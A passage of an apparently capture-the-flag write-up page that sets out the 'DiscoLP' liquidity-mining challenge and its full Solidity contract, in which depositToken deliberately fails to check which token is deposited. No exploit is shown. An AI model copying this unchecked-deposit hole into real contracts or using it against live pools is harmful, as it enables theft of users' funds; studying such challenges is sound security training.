15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>DiscoLP is a brand new liquidity mining protocol! You can participate by depositing some JIMBO or JAMBO tokens. All liquidity will be supplied to JIMBO-JAMBO Uniswap pair. By providing liquidity with us you will get DISCO tokens in return!</p></blockquote>\n<p>You have 1 JIMBO and 1 JAMBO, can you get at least 100 DISCO tokens?</p>\n<h3 id=\"Code-1\"><a href=\"#Code-1\" class=\"headerlink\" title=\"Code\"></a>Code</h3><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">>=</span><span class=\"token version number\">0.6.5</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/math/SafeMath.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/access/Ownable.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./Babylonian.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">DiscoLP</span> <span class=\"token keyword\">is</span> ERC20<span class=\"token punctuation\">,</span> Ownable<span class=\"token punctuation\">,</span> ReentrancyGuard\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeERC20</span> <span class=\"token keyword\">for</span> IERC20<span class=\"token punctuation\">;</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> immutable reserveToken<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _symbol<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint8</span> _decimals<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _reserveToken<span class=\"token punctuation\">)</span>\n    <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span>_name<span class=\"token punctuation\">,</span> _symbol<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">_setupDecimals</span><span class=\"token punctuation\">(</span>_decimals<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>_reserveToken <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    reserveToken <span class=\"token operator\">=</span> _reserveToken<span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100000</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">**</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// some inital supply</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">calcCostFromShares</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _shares<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _cost<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> _shares<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token function\">totalReserve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">totalReserve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _totalReserve<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>reserveToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token comment\">// accepts only JIMBO or JAMBO tokens</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">depositToken</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _minShares<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> _from <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> _minCost <span class=\"token operator\">=</span> <span class=\"token function\">calcCostFromShares</span><span class=\"token punctuation\">(</span>_minShares<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_amount <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>_token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">safeTransferFrom</span><span class=\"token punctuation\">(</span>_from<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token builtin\">uint256</span> _cost <span class=\"token operator\">=</span> UniswapV2LiquidityPoolAbstraction<span class=\"token punctuation\">.</span><span class=\"token function\">_joinPool</span><span class=\"token punctuation\">(</span>reserveToken<span class=\"token punctuation\">,</span> _token<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">,</span> _minCost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> _shares <span class=\"token operator\">=</span> _cost<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token function\">totalReserve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_cost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>_from<span class=\"token punctuation\">,</span> _shares<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">UniswapV2LiquidityPoolAbstraction</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeERC20</span> <span class=\"token keyword\">for</span> IERC20<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">_joinPool</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _pair<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _minShares<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _shares<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_amount <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> _router <span class=\"token operator\">=</span> $<span class=\"token punctuation\">.</span>UniswapV2_ROUTER02<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> _token0 <span class=\"token operator\">=</span> <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>_pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">token0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> _token1 <span class=\"token operator\">=</span> <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>_pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">token1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> _otherToken <span class=\"token operator\">=</span> _token <span class=\"token operator\">==</span> _token0 <span class=\"token operator\">?</span> _token1 <span class=\"token punctuation\">:</span> _token0<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _reserve0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _reserve1<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">Pair</span><span class=\"token punctuation\">(</span>_pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getReserves</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> _swapAmount <span class=\"token operator\">=</span> <span class=\"token function\">_calcSwapOutputFromInput</span><span class=\"token punctuation\">(</span>_token <span class=\"token operator\">==</span> _token0 <span class=\"token operator\">?</span> _reserve0 <span class=\"token punctuation\">:</span> _reserve1<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_swapAmount <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> _swapAmount <span class=\"token operator\">=</span> _amount <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> _leftAmount <span class=\"token operator\">=</span> _amount<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_swapAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_approveFunds</span><span class=\"token punctuation\">(</span>_token<span class=\"token punctuation\">,</span> _router<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _path <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    _path<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _token<span class=\"token punctuation\">;</span>\n    _path<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _otherToken<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> _otherAmount <span class=\"token operator\">=</span> <span class=\"token function\">Router02</span><span class=\"token punctuation\">(</span>_router<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">swapExactTokensForTokens</span><span class=\"token punctuation\">(</span>_swapAmount<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> _path<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_approveFunds</span><span class=\"token punctuation\">(</span>_otherToken<span class=\"token punctuation\">,</span> _router<span class=\"token punctuation\">,</span> _otherAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">(</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">,</span>_shares<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">Router02</span><span class=\"token punctuation\">(</span>_router<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">addLiquidity</span><span class=\"token punctuation\">(</span>_token<span class=\"token punctuation\">,</span> _otherToken<span class=\"token punctuation\">,</span> _leftAmount<span class=\"token punctuation\">,</span> _otherAmount<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_shares <span class=\"token operator\">>=</span> _minShares<span class=\"token punctuation\">,</span> <span class=\"token string\">\"high slippage\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> _shares<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">_calcSwapOutputFromInput</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _reserveAmount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _inputAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> Babylonian<span class=\"token punctuation\">.</span><span class=\"token function\">sqrt</span><span class=\"token punctuation\">(</span>_reserveAmount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>_inputAmount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token number\">3988000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>_reserveAmount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token number\">3988009</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_reserveAmount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token number\">1997</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">1994</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">_approveFunds</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">uint256</span> _allowance <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>_token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_allowance <span class=\"token operator\">></span> _amount<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>_token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">safeDecreaseAllowance</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">,</span> _allowance <span class=\"token operator\">-</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_allowance <span class=\"token operator\">&lt;</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>_token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">safeIncreaseAllowance</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">,</span> _amount <span class=\"token operator\">-</span> _allowance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">$</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">constant</span> UniswapV2_FACTORY <span class=\"token operator\">=</span> <span class=\"token number\">0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ropsten</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">constant</span> UniswapV2_ROUTER02 <span class=\"token operator\">=</span> <span class=\"token number\">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ropsten</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Router01</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">WETH</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">addLiquidity</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _tokenA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _tokenB<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountADesired<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountBDesired<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountAMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountBMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountB<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _liquidity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">removeLiquidity</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _tokenA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _tokenB<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _liquidity<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountAMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountBMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">swapExactTokensForTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountIn<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountOutMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> _path<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _amounts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">swapETHForExactTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountOut<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> _path<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _amounts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">getAmountOut</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountIn<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _reserveIn<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _reserveOut<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountOut<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Router02</span> <span class=\"token keyword\">is</span> Router01\n<span class=\"token punctuation\">&#123;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">PoolToken</span> <span class=\"token keyword\">is</span> IERC20\n<span class=\"token punctuation\">&#123;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Pair</span> <span class=\"token keyword\">is</span> PoolToken\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">token0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">token1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">price0CumulativeLast</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _price0CumulativeLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">price1CumulativeLast</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _price1CumulativeLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">getReserves</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint112</span> _reserve0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint112</span> _reserve1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint32</span> _blockTimestampLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _liquidity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">sync</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" 